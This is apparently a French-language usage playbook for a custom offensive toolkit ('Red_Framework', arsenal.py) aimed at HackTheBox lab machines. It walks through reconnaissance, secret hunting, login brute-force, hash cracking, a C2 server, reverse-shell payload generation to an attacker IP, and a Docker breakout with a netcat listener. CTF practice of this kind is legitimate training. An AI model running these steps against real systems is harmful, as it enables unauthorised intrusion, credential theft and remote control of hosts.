```markdown
# 🎯 Playbook Offensif : Red_Framework vs HackTheBox

Ce guide décrit le flux de travail standard pour auditer et compromettre une machine cible (CTF/HTB) en utilisant le Red_Framework.

---

## 🛠️ Étape 0 : Préparation de l'Environnement

Avant de lancer le moindre script, assurez-vous d'être connecté au VPN de la cible et de configurer la résolution DNS.

1. **Trouver votre IP locale (LHOST) :**
   ```bash
   ip a s tun0  # Récupérez l'IP qui commence souvent par 10.10.x.x
   ```
2. **Ajouter la cible au fichier hosts (Si applicable) :**
   ```bash
   sudo nano /etc/hosts
   # Ajouter : 10.10.11.222   machine.htb
   ```

---

## 👁️ Étape 1 : Reconnaissance Initiale

L'objectif est de cartographier la surface d'attaque sans déclencher (trop) d'alertes.

**1. Énumération des Sous-domaines (OSINT + Brute-force) :**
```bash
python arsenal.py sub -d machine.htb --auto-scan
```
*Note : L'option `--auto-scan` lancera un scan de ports automatique sur tout ce qu'il trouve.*

**2. Scan de Ports Manuel (Si pas d'auto-scan) :**
```bash
python arsenal.py scan -T 10.10.11.222
```

---

## 🕸️ Étape 2 : L'Audit Web (Creuser la surface)

Si les ports 80 ou 443 sont ouverts, on déploie l'artillerie Web.

**1. Cartographie et détection CMS :**
```bash
python arsenal.py spider -u [http://machine.htb](http://machine.htb)
```
*Le spider appellera automatiquement le module CMS Detect.*

**2. Traque des secrets Javascript et API :**
```bash
python arsenal.py js-sniper -u [http://machine.htb](http://machine.htb)
```

**3. Recherche de répertoires cachés (.git, .env) :**
```bash
python arsenal.py secrets -u [http://machine.htb](http://machine.htb)
```

---

## 💥 Étape 3 : L'Exploitation (Casser les portes)

Si vous trouvez une page de connexion ou un hash de mot de passe lors de l'étape 2.

**1. Brute-force d'un formulaire Web (Ex: Mire de login) :**
```bash
python arsenal.py brute-web -u [http://machine.htb/login](http://machine.htb/login) -U admin
```
*L'Auto-Pilot testera vos wordlists customisées puis basculera sur le top 10k.*

**2. Casser un Hash volé hors-ligne :**
```bash
python arsenal.py crack --hash 5f4dcc3b5aa765d61d8327deb882cf99
```

---

## 👑 Étape 4 : Post-Exploitation & Mouvement Latéral

Vous avez un accès ou la possibilité d'uploader un fichier malveillant ? Il est temps de déployer le C2.

**1. Lancer le serveur Command & Control (Sur votre machine) :**
```bash
python arsenal.py c2 -p 4444
```

**2. Générer un payload pour la victime :**
```bash
python arsenal.py payload --revshell 10.10.x.x:4444
```
*Uploadez ou exécutez ce payload sur la machine cible pour faire un "call back" vers votre C2.*

**3. Interaction C2 :**
Une fois la session reçue, le C2 fera son Auto-Recon (PrivEsc check).
```text
C2> sessions         # Voir les victimes
C2> interact 1       # Prendre le contrôle de la session 1
```

---

## 🚀 Étape 5 : L'Évasion (Sortir de la matrice)

Si le C2 indique que vous êtes l'utilisateur `www-data` ou `root` mais dans un conteneur (Docker).

**1. Générer le script d'évasion :**
```bash
python arsenal.py docker --lhost 10.10.x.x --lport 9999
```

**2. Déployer et exécuter :**
* Ouvrez un nouveau terminal (`nc -lvnp 9999`).
* Via votre session C2 actuelle, transférez `breakout.sh` sur la cible et exécutez-le. Vous récupérerez un shell `root` sur l'hôte physique.

---

## 📄 Étape 6 : Fin de mission et Reporting

Une fois l'audit terminé, générez la documentation pour valider la machine (ou le client).

```bash
python arsenal.py export
```
*Le rapport HTML sera disponible dans le dossier `/reports/` avec l'historique de toutes vos trouvailles.*
```

---